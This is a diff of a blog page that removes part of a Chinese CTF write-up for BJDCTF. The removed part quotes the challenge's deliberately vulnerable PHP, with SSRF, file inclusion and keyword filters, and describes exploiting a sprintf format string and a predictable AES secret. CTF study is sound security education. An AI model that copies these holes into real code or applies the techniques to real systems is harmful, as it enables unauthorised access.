-                &lt;button class=&quot;next&quot;&gt;&lt;/button&gt;
-                &lt;div class=&quot;progress&quot;&gt;&lt;/div&gt;
-                &lt;span class=&quot;number&quot;&gt;
-                    &lt;span class=&quot;number-current&quot;&gt;&lt;/span&gt;
-                    &lt;span class=&quot;number-total&quot;&gt;&lt;/span&gt;
-                &lt;/span&gt;
-                &lt;span class=&quot;error-message&quot;&gt;&lt;/span&gt;
-            &lt;/div&gt;
-        &lt;/div&gt;
-        &lt;span class=&quot;final-message&quot;&gt;&lt;/span&gt;
-    &lt;/form&gt;
-    &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href=&quot;https://gem-love.com&quot; target=&quot;_blank&quot;&gt;@é¢å¥L&#39;Amore&lt;/a&gt;&lt;/center&gt;&lt;/p&gt;&lt;/span&gt;
-&lt;/section&gt;
-
-&lt;script type=&quot;text/javascript&quot; src=&quot;js/classie.js&quot;&gt;&lt;/script&gt;
-&lt;script type=&quot;text/javascript&quot; src=&quot;js/stepsForm.js&quot;&gt;&lt;/script&gt;
-&lt;script type=&quot;text/javascript&quot;&gt;
-    var theForm = document.getElementById( &#39;theForm&#39; );
-
-    new stepsForm( theForm, {
-        onSubmit : function( form ) {
-            classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; );
-            var messageEl = theForm.querySelector( &#39;.final-message&#39; );
-            form.submit();
-            messageEl.innerHTML = &#39;Ok...Let me have a check&#39;;
-            classie.addClass( messageEl, &#39;show&#39; );
-        }
-    } );
-&lt;/script&gt;
-
-&lt;/body&gt;
-&lt;/html&gt;
-&lt;?php
-
-$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;
-$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;
-
-
-if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) {
-    $url = $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;;
-    $method = $_POST[&#39;q3&#39;];
-
-    $str1 = &quot;~$ python fuck.py -u \&quot;&quot;.$url .&quot;\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;;
-
-    echo $str1;
-
-    if (!preg_match($filter1, $url) ){
-        die($str2);
-    }
-    if (preg_match($filter2, $url)) {
-        die($str3);
-    }
-    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {
-        die($str4);
-    }
-    $detect = @file_get_contents($url, false);
-    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));
-}
-
-?&gt;
-</code></pre>
-<p>home.php</p>
-<pre><code class="php">&lt;?php
-
-setcookie(&quot;y1ng&quot;, sha1(md5(&#39;y1ng&#39;)), time() + 3600);
-setcookie(&#39;your_ip_address&#39;, md5($_SERVER[&#39;REMOTE_ADDR&#39;]), time()+3600);
-
-if(isset($_GET[&#39;file&#39;])){
-    if (preg_match(&quot;/\^|\~|&amp;|\|/&quot;, $_GET[&#39;file&#39;])) {
-        die(&quot;forbidden&quot;);
-    }
-
-    if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#39;file&#39;])){
-        die(&quot;not now!&quot;);
-    }
-
-    if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#39;file&#39;])){
-        die(&quot;You! are! not! my! admin!&quot;);
-    }
-
-    if(preg_match(&quot;/^home$/i&quot;, $_GET[&#39;file&#39;])){
-        die(&quot;不要套娃&quot;);
-    }
-
-    else{
-        if(preg_match(&quot;/home$/i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#39;file&#39;])){
-            $file = $_GET[&#39;file&#39;].&quot;.php&quot;;
-        }
-        else{
-            $file = $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;
-        }
-        echo &quot;你现在访问的是&quot;.$file . &quot;&lt;br&gt;&quot;;
-        require $file;
-    }
-} else {
-    echo &quot;&lt;script&gt;location.href=&#39;./home.php?file=system&#39;&lt;/script&gt;&quot;;
-}</code></pre>
-<p>我们看到:</p>
-<pre><code class="php">$filter1 = &#39;/^http:\/\/127\.0\.0\.1\//i&#39;;
-$filter2 = &#39;/.?f.?l.?a.?g.?/i&#39;;    
-if (!preg_match($filter1, $url) ){
-        die($str2);
-    }
-    if (preg_match($filter2, $url)) {
-        die($str3);
-    }
-    if (!preg_match(&#39;/^GET/i&#39;, $method) &amp;&amp; !preg_match(&#39;/^POST/i&#39;, $method)) {
-        die($str4);
-    }
-    $detect = @file_get_contents($url, false);
-    print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));</code></pre>
-<p>我们利用<code>$method</code>来转义<code>%d</code>,在<code>$url</code>中加个<code>%s</code>就可以查看ssrf的内容了</p>
-<p>扫描目录发现:admin.php,但是要从内网访问</p>
-<p>ssrf访问得到</p>
-<pre><code class="php">0 &lt;?php
-error_reporting(0);
-session_start();
-$f1ag = &#39;f1ag{s1mpl3_SSRF_@nd_spr1ntf}&#39;; //fake
-
-function aesEn($data, $key)
-{
-    $method = &#39;AES-128-CBC&#39;;
-    $iv = md5($_SERVER[&#39;REMOTE_ADDR&#39;],true);
-    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
-}
-
-function Check()
-{
-    if (isset($_COOKIE[&#39;your_ip_address&#39;]) &amp;&amp; $_COOKIE[&#39;your_ip_address&#39;] === md5($_SERVER[&#39;REMOTE_ADDR&#39;]) &amp;&amp; $_COOKIE[&#39;y1ng&#39;] === sha1(md5(&#39;y1ng&#39;)))
-        return true;
-    else
-        return false;
-}
-
-if ( $_SERVER[&#39;REMOTE_ADDR&#39;] == &quot;127.0.0.1&quot; ) {
-    highlight_file(__FILE__);
-} else {
-    echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#39;10px&#39; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#39;REMOTE_ADDR&#39;];
-}
-
-
-$_SESSION[&#39;user&#39;] = md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
-
-if (isset($_GET[&#39;decrypt&#39;])) {
-    $decr = $_GET[&#39;decrypt&#39;];
-    if (Check()){
-        $data = $_SESSION[&#39;secret&#39;];
-        include &#39;flag_2sln2ndln2klnlksnf.php&#39;;
-        $cipher = aesEn($data, &#39;y1ng&#39;);
-        if ($decr === $cipher){
-            echo WHAT_YOU_WANT;
-        } else {
-            die(&#39;爬&#39;);
-        }
-    } else{
-        header(&quot;Refresh:0.1;url=index.php&quot;);
-    }
-} else {
-    //I heard you can break PHP mt_rand seed
-    mt_srand(rand(0,9999999));
-    $length = mt_rand(40,80);
-    $_SESSION[&#39;secret&#39;] = bin2hex(random_bytes($length));
-}
-?&gt;</code></pre>
-<p>我们发现如果我们带decrypt参数直接访问,就不会生成secret了,那么<code>$cipher = aesEn(&#39;&#39;, &#39;y1ng&#39;);</code></p>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/03/25/BJDCTF/">http://blog.ccreater.top/2020/03/25/BJDCTF/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/03/25/BJDCTF/" data-id="cka3ckr1y000cv4v0dd3v9t6r" data-title="BJDCTF" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -3047,6 +2930,10 @@ if (isset($_GET[&#39;decrypt&#39;])) {
       <ul>
         
           <li>
+            <a href="/2020/10/26/2020ByteCTF/">2020ByteCTF</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
           </li>
         
@@ -3060,10 +2947,6 @@ if (isset($_GET[&#39;decrypt&#39;])) {
         
           <li>
             <a href="/2020/10/15/Service%20Worker/">Service Worker</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
           </li>
         
       </ul>
